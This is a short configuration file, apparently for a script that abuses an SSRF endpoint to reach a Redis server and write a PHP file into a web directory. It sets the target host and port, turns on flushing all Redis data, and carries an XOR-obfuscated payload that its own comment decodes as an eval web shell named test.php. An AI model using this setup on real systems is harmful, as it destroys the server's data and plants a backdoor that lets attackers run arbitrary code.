#dict writeshell
SSRFURL="http://127.0.0.1/ssrf.php?url="
RHOST="192.168.113.145"
RPORT=6379
FLUSHALL="yes"
bgsaveerror="no"
XORKEY="@@@@@@@@@@@@@@@@@@@@@@"
RWEBPORT=80
DIRPATH="/var/www/html/"
SHELLNAME="test.php"
SHELL=r"|\x7f}%6!,hd\x1f\a\x05\x14\x1byqq\x1di{\x7f~" #<?=eval($_GET[911]);?>